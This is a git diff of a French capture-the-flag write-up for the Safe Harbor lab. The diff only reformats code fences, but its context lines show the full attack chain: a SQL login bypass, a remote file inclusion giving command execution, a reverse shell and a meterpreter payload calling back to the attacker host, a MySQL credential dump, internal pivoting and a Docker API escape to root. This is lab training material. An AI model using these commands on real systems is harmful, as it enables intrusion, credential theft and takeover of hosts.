@@ -10,7 +10,7 @@ A la recherche d'un CTF pour exercer les skills de pivot, je suis tombé sur [Sa
 
 Ce CTF est de type boot2root donc tourné vers un scénario réaliste.  
 
-```plain
+```
 $ sudo nmap -T5 -sC -sV -p- 192.168.56.11
 [sudo] Mot de passe de root : 
 Starting Nmap 7.92 ( https://nmap.org )
@@ -37,7 +37,7 @@ Un classique serveur web accompagné de son serveur SSH. L'auteur a aussi fait l
 
 J'ai eu quelques désagréments sur quelques challenges récents du coup je préfère sortir direct l'artillerie lourde et tester différentes extensions lors de l'énumération sur le serveur web :  
 
-```plain
+```
 $ feroxbuster -u http://192.168.56.11/ -w directory-list-2.3-big.txt -x php,html,zip,tar.gz,txt -n
 
  ___  ___  __   __     __      __         __   ___
@@ -82,14 +82,14 @@ Login bypass
 
 En testant la page de login pour une faille SQL (on peut juste placer des guillemets et apostrophes dans les champs) j'obtiens une erreur évocatrice :  
 
-```plain
+```
 
 Warning: mysqli_num_rows() expects parameter 1 to be mysqli_result, boolean given in /var/www/html/login.php on line 16
 ```
 
 Bizarrement la vulnérabilité ne semble pas toujours présente, d'ailleurs SQLmap ne parvient pas à dumper quoi que ce soit mais valide tout de même ce cas de bypass malgré lui puisqu'il accède à la page normalement protégée :  
 
-```plain
+```
 $ python sqlmap.py -u http://192.168.56.11/ --data "user=admin&password=admin&s=Login" --risk 3 --level 5 --dbms mysql
 
 --- snip ---
@@ -104,7 +104,7 @@ got a 302 redirect to 'http://192.168.56.11:80/OnlineBanking/index.php?p=welcome
 
 L'appli web permet de transférer des sommes d'un compte de notre choix. On a ainsi la liste d'utilisateurs suivante :  
 
-```plain
+```
 Admin
 Bill
 Steve
@@ -115,13 +115,13 @@ Quinten
 
 A conserver au cas où. Pour le reste l'URL vers laquelle on est redirigée a un format qui pourrait correspondre à une faille d'inclusion PHP. Je tente donc d'ajouter un préfixe pour tester :  
 
-```plain
+```
 http://192.168.56.11/OnlineBanking/index.php?p=http://127.0.0.1/welcome
 ```
 
 Et ça paye :  
 
-```plain
+```
 Warning: include(http://127.0.0.1/welcome.php): failed to open stream: Connection refused in /var/www/html/OnlineBanking/index.php on line 13
 
 Warning: include(): Failed opening 'http://127.0.0.1/welcome.php' for inclusion (include_path='.:/usr/local/lib/php') in /var/www/html/OnlineBanking/index.php on line 13
@@ -139,7 +139,7 @@ Il ne reste plus qu'à fournir un serveur web (*python3 -m http.server*) contena
 
 On obtient ainsi notre exécution de commande :  
 
-```plain
+```
 http://192.168.56.11/OnlineBanking/index.php?p=http://192.168.56.1:8000/welcome&cmd=id
 ```
 
@@ -154,13 +154,13 @@ Je vais donc me servir de [ReverseSSH](https://github.com/Fahrj/reverse-ssh) (ic
 
 D'abord je met un port en écoute sur ma machine pour un scénario de reverse-shell :  
 
-```plain
+```
 $ ./reverse-sshx64 -l -p 2244 -v
 ```
 
 Et sur le Docker (via le webshell du coup) :  
 
-```plain
+```
 $ reverse-ssh -v -p 2424 192.168.56.1 
 2021/12/16 12:08:44 Dialling home via ssh to 192.168.56.1:2244
 2021/12/16 12:08:44 Success: listening at home on 127.0.0.1:8888
@@ -232,7 +232,7 @@ In the neighboorhood
 
 *LinPEAS* remonte quelques informations sur le réseau, à commencer par l'interface :  
 
-```plain
+```
 eth0      Link encap:Ethernet  HWaddr 02:42:AC:14:00:08  
           inet addr:172.20.0.8  Bcast:172.20.255.255  Mask:255.255.0.0
           UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
@@ -244,7 +244,7 @@ eth0      Link encap:Ethernet  HWaddr 02:42:AC:14:00:08
 
 Ainsi que quelques adresses dans le cache ARP :  
 
-```plain
+```
 harborbank_apache_1.harborbank_backend (172.20.0.7) at 02:42:ac:14:00:07 [ether]  on eth0
 harborbank_apache_v2_1.harborbank_backend (172.20.0.6) at 02:42:ac:14:00:06 [ether]  on eth0
 harborbank_apache_v2_2.harborbank_backend (172.20.0.5) at 02:42:ac:14:00:05 [ether]  on eth0
@@ -252,7 +252,7 @@ harborbank_apache_v2_2.harborbank_backend (172.20.0.5) at 02:42:ac:14:00:05 [eth
 
 Comme on a vu plus tôt avec les credentials MySQL, le serveur de base de données est sur un autre container nommé *mysql* :  
 
-```plain
+```
 /var/www/html/OnlineBanking $ nc mysql 3306 -vz
 mysql (172.20.0.138:3306) open
 ```
@@ -265,7 +265,7 @@ $ ssh -p 8888 -L 33306:172.20.0.138:3306 127.0.0.1
 
 et ça dumpe :  
 
-```plain
+```
 $ mysql -u root -h 127.0.0.1 -P 33306 -p
 Enter password: 
 Welcome to the MariaDB monitor.  Commands end with ; or \g.
@@ -318,7 +318,7 @@ Ces identifiants ne permettent malheureusement pas d'accéder à un compte sur l
 
 Inutile de perdre du temps avec un Proxychains, l'upload d'un Nmap compilé statiquement nous fera gagner un temps précieux sur la découverte du réseau interne.  
 
-```plain
+```
 ~ $ ./nmap -sP 172.20.0.8/16 -T5
 
 Starting Nmap 7.11 ( https://nmap.org ) at 2021-12-16 12:42 UTC
@@ -411,7 +411,7 @@ PORT     STATE SERVICE
 Les noms d'hôtes étant assez explicites je me suis attaché à extraire le titre HTML pour les différents serveurs webs. J'ai aussi remarqué que le commentaire mentionnant le changelog avait un comportement différent, certainement signe d'un mécanisme de load-balancing :  
 
 {% raw %}
-```plain
+```
 http://172.20.0.1/
 Server: nginx/1.17.4
 <title>Login</title>
@@ -497,7 +497,7 @@ At least you tried
 
 En revanche en testant [un vieil exploit](https://www.exploit-db.com/exploits/36337) en Python on est vite fixé sur ce qu'on peut faire :  
 
-```plain
+```
 $ python 36337.py 127.0.0.1
 
 ▓█████  ██▓    ▄▄▄        ██████ ▄▄▄█████▓ ██▓ ▄████▄    ██████  ██░ ██ ▓█████  ██▓     ██▓    
@@ -526,7 +526,7 @@ On va quitter notre *ReverseSSH* et profiter des fonctionnalités de Metasploit.
 
 D'abord générer la backdoor :  
 
-```plain
+```
 $ msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.56.4 LPORT=4444 -f elf -o /tmp/rev_met
 [-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
 [-] No arch selected, selecting arch: x64 from the payload
@@ -540,7 +540,7 @@ Qu'on uploade et exécute sur la victime. Il faut avoir préalablement lancé le
 
 Une fois la session Metasploit récupérée on la met en fond avec la commande *bg* (ou *background*) et on va chercher le module d'escalade de privilège adapté et lui fournir les options nécessaires (l'ID de la session, le payload, etc) :  
 
-```plain
+```
 msf6 exploit(linux/local/docker_privileged_container_escape) > show options
 
 Module options (exploit/linux/local/docker_privileged_container_escape):
@@ -583,7 +583,7 @@ sh: 1: cannot create /sys/fs/cgroup/rdma/nknDFX/cgroup.procs: Directory nonexist
 
 Ça ne fonctionne pas et pour cause le système de fichier est monté read-only :  
 
-```plain
+```
 cgroup on /sys/fs/cgroup/rdma type cgroup (ro,nosuid,nodev,noexec,relatime,rdma)
 ```
 
@@ -612,7 +612,7 @@ Et en effet il semble que ce container ait accès au port 2375 de Docker qu'on a
 
 Metasploit dispose d'un module adapté *linux/http/docker\_daemon\_tcp* dont voici la description :  
 
-```plain
+```
 Description:
   Utilizing Docker via unprotected tcp socket (2375/tcp, maybe 
   2376/tcp with tls but without tls-auth), an attacker can create a 
@@ -627,7 +627,7 @@ Description:
 
 Vu que la VM est en host-only il va falloir être en mesure d'utiliser une image existante en local, sans quoi :  
 
-```plain
+```
 msf6 exploit(linux/http/docker_daemon_tcp) > show options
 
 Module options (exploit/linux/http/docker_daemon_tcp):
@@ -667,7 +667,7 @@ msf6 exploit(linux/http/docker_daemon_tcp) > run
 
 Il aura fallut d'abord utiliser la fonctionnalité de port-forwarding sur la session Meterpreter :  
 
-```plain
+```
 meterpreter > portfwd add -l 2375 -p 2375 -r 172.20.0.1
 [*] Local TCP relay created: :2375 <-> 172.20.0.1:2375
 ```
@@ -676,7 +676,7 @@ Ce port Docker dispose d'une interface REST et j'ai trouvé quelques astuces [su
 
 On peut ainsi lister les containers de cette façon :  
 
-```plain
+```
 $ curl -s http://127.0.0.1:2375/containers/json | python3 -m json.tool
 ```
 
@@ -703,7 +703,7 @@ Il suffit de remplacer le mot *containers* par *images* pour obtenir les images 
 
 Il nous suffit de réutiliser le module Metasploit mais en spécifiant cette fois le bon nom d'image :  
 
-```plain
+```
 $ msf6 exploit(linux/http/docker_daemon_tcp) > set DOCKERIMAGE alpine:3.2
 DOCKERIMAGE => alpine:3.2
 msf6 exploit(linux/http/docker_daemon_tcp) > run
@@ -724,7 +724,7 @@ safeharbor
 
 On trouve un flag ainsi qu'un flag bonus dans le dossier de *root* :  
 
-```plain
+```
 root@safeharbor:~# cat Flag.txt 
            _-_
           |(_)|
@@ -759,7 +759,7 @@ Author: AbsoZed (Dylan Barker)
 
 Un troisième flag est présent dans une archive ZIP mais celle-ci est protégée par mot de passe :  
 
-```plain
+```
 root@safeharbor:~# find / -iname "*flag*" 2> /dev/null 
 /root/Flag.txt
 /root/Bonus_Flag_2.txt
@@ -775,7 +775,7 @@ On trouve dans */home/absozed/HarborBank/* le docker-compose ainsi que les Docke
 
 Le Nginx était configuré en load-balancing ce qui expliquait pourquoi la vulnérabilité SQL était sporadique (10 ans que je voulais le placer ce mot lol) :  
 
-```plain
+```
 upstream HarborBanking {
     server harborbank_apache_1:80 weight=1;
     server harborbank_apache_v2_1:80 weight=1;
@@ -791,7 +791,7 @@ server {
 
 Enfin pourquoi le container sur lequel on récupère un shell ne fait pas tourner de serveur web ? Il s'agit en fait d'un [PHP-FPM](https://fr.wikipedia.org/wiki/PHP-FPM) ce qui explique aussi pourquoi il n'y avait que le port 9000 :  
 
-```plain
+```
 [www]
 user = www-data
 group = www-data
